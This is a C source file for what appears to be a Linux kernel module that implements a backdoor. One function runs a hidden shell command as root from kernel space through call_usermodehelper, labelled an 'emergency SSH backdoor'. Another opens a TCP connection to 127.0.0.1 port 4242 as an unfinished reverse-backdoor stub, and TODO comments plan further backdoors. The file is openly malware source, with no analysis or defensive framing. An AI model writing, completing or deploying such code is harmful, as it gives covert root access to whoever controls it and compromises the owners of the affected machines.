#include "backdoor.h"

#include <linux/types.h>
#include <linux/net.h>
#include <linux/skbuff.h>
#include <linux/un.h>
#include <linux/unistd.h>
#include <linux/wait.h>
#include <linux/ctype.h>
#include <linux/unistd.h>
#include <asm/unistd.h>
#include <linux/inet.h>
#include <net/ip.h>
#include <net/sock.h>
#include <net/tcp.h>

static void backdoor_ssh(void) {

    char *argv[] = { "/bin/bash", "-c", BCK_SSH, NULL };
    char *envp[] = { "HOME=/", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}


static void backdoor_reverse(void) {

    struct socket*        sock = NULL;
    struct sockaddr_in*   dest = {0};
    int                   error = 0;

    dest = (struct sockaddr_in*)kmalloc(sizeof(struct sockaddr_in), GFP_KERNEL);
    sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    dest->sin_family = AF_INET;
    dest->sin_addr.s_addr = in_aton("127.0.0.1");
    dest->sin_port = htons(4242);
    printk(KERN_EMERG "Connect to %X:%u\n", dest->sin_addr.s_addr, 4242);

    error = sock->ops->connect(sock, (struct sockaddr*)dest, sizeof(struct sockaddr_in), !O_NONBLOCK);
    if (error >= 0) {
        printk(KERN_EMERG "Connected\n");
        sock_release(sock);
    }
    else
        printk(KERN_EMERG "Error %d\n", -error);


}

void backdoor(void) {

    /* EMERGENCY SSH BACKDOOR */
    if (ALLOW_SSH == 1) {
        backdoor_ssh();
    }

    /* TODO REVERSE BACKDOOR */
    backdoor_reverse();

    /* TODO ACTIVATOR BACKDOOR */
}